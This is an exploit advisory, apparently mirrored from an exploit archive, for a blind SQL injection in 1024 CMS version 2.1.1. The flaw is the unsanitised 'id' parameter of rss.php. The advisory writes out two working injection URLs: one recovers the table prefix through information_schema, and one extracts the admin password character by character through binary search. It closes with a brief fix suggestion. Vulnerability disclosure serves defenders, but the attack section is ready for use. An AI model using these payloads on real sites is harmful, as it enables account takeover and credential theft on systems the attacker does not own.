@@ -1,0 +1,71 @@
+id: 11164
+date: 03/04/2010
+title: 1024 CMS <= 2.1.1 Blind SQL Injection Vulnerability
+author: AmnPardaz
+cves: 
+
+===================================================
+1024 CMS <= 2.1.1 Blind SQL Injection Vulnerability
+===================================================
+
+# Title:		1024CMS Blind SQL Injection Vulnerability
+# Vendor:		http://www.1024cms.org/
+# Vulnerable Version:	2.1.1 (Latest version till now)
+# Exploitation:		Remote with browser
+# Fix:			N/A
+####################
+- Description:
+####################
+
+1024CMS is a PHP-based CMS which uses MySQL as its backend DBMS. It support forums, downloads,
+search capability, BB code capability, gallery, chat and RSS services.
+
+
+####################
+- Vulnerability:
+####################
+
++--> Blind SQL Injection
+	The RSS page (rss.php) is vulnerable to SQL injection. The GET variable 'id' is
+	not sanitized correctly in the SQL query. This hole can be used for extracting
+	admin password. For details see 'Exploits' section.
+
+####################
+- Exploits/PoCs:
+####################
+
++--> Exploiting The (MySQL) Blind SQL Injection:
+	The GET parameter 'id' can be used for SQL injections while the other GET parameter 't'
+	be equal with 'vp' in the rss.php file.
+	The general SQL injection vector will be like this:
+	<url-to-site>/rss.php?t=vp&id=0'or(EXISTS
+           (SELECT * FROM otatf_users WHERE username='admin' AND SUBSTR(password,i,1)<'?')) --'
+
+	In the above vector 'id' is used to indicate the ID of the posts which must be returned
+	and (since there is no post with id of zero) the total query will be true (and the
+	resulting RSS page will not be empty) iff the subquery be true. Using above vector and
+	binary searching on '?' for each character 'i', the password of user admin can be extracted.
+
+	But the tables are protected by a prefix (in the above example the 'otatf_' is the prefix
+	and before using this vector we need to find the prefix by a similar manner. We can use
+	following vector for this purpose:
+	<url-to-site>/rss.php?t=vp&id=0'or(EXISTS
+           (SELECT * FROM (SELECT SUBSTRING(TABLE_NAME,1,LENGTH(TABLE_NAME)-8) AS PREFIX
+                           FROM information_schema.TABLES where TABLE_SCHEMA=DATABASE() LIMIT 1) AS TMP
+                     WHERE SUBSTR(PREFIX,i,1)<"?")) --'
+
+	In this vector, the inner query will the find name of the first table which for 'otatf_' prefix
+	will be 'otatf_adminlog' and extract the prefix part of it. The outer query will find characters
+	of this prefix by iterating over 'i' and binary searching on '?'.
+
+####################
+- Solution:
+####################
+
+Remove rss.php and wait for bug fixation by vendor or escape GET parameter in file rss.php using the
+vendor string escaping function 'quote_smart' as is used in all of other files else of this one.
+
+
+
+
+#  0day.today [2023-03-25]  #
